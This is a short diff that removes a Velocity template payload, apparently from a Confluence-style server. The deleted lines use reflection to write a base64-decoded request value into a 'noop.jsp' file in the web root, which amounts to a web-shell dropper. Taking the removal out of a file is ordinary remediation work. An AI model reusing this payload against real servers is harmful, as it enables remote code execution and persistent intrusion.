@@ -1,8 +1,0 @@
-#set($e="e")
-#set($p=$req.getSession().getServletContext().getRealPath("/").concat("noop.jsp"))
-$e.getClass().forName("org.apache.commons.io.IOUtils").getMethod("write",$e.getClass().forName("java.lang.String"),$e.getClass().forName("java.io.OutputStream")).invoke(null,$p,$res.getOutputStream())
-$res.getOutputStream().close()
-#set($f=$e.getClass().forName("java.io.FileWriter").getConstructor($e.getClass().forName("java.lang.String")).newInstance($p))
-#set($c=$generalUtil.base64Decode($content))
-$f.write($c, 0, $c.length())
-$f.close()
